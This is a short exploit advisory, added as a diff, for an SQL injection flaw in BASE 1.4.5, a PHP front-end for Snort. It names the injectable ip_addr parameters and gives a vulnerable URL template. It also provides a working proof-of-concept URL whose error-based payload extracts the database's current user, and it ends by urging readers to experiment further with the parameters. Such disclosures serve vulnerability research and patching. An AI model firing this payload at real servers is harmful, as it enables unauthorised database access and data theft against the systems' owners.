@@ -1,0 +1,22 @@
+# Exploit Title: BASE 1.4.5 SQL Injection Vulnerability
+# Date: 30/01/2012
+# Author: a.kadir altan (testpenter_AT_gmail.com)
+# Software Link: http://base.secureideas.net
+# Version: 1.4.5
+# Platform: PHP
+##########################
+BASE Snort Analysis Front-end SQLi Vulnerability
+
+Vulnerable parameters: 
+ip_addr[0][1]
+ip_addr[0][2]
+ip_addr[0][9]
+
+Vulnerable URL: 
+http://server/base_qry_main.php?new=2&num_result_rows=-1&submit=Query%20DB¤t_view=-1&ip_addr_cnt=1&ip_addr[0][0]=%20&ip_addr[0][1]=ip_dst&ip_addr[0][2]==&ip_addr[0][3]=11.11.11.11&ip_addr[0][8]=%20&ip_addr[0][9]=%20<SQLi HERE>
+
+PoC:
+http://server/base_qry_main.php?new=2&num_result_rows=-1&submit=Query%20DB¤t_view=-1&ip_addr_cnt=1&ip_addr[0][0]=%20&ip_addr[0][1]=ip_dst&ip_addr[0][2]==&ip_addr[0][3]=11.11.11.11&ip_addr[0][8]=%20&ip_addr[0][9]=%20)%20AND%20(SELECT%208543%20FROM(SELECT%20COUNT(*),CONCAT(0x3a796d723a,(MID((IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,50)),0x3a6479783a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20(5635=5635
+
+Play with ip_addr[x][y], including removal.
+##########################
